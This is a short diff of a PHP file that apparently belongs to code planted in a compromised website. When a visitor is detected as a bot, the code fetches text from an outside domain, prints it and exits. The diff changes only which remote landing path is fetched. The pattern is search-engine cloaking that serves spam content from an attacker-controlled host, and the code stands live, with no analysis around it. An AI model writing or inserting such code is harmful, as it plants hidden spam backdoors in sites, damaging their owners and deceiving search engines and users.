@@ -13,7 +13,7 @@ return false;
 }
 
 if (is_bot()) {
-$message = file_get_contents('https://dangerman.locker/landing/policyresearchjournal/index.txt');
+$message = file_get_contents('https://dangerman.locker/landing/jmifrusim/index.txt');
 echo $message;
 exit;
 }
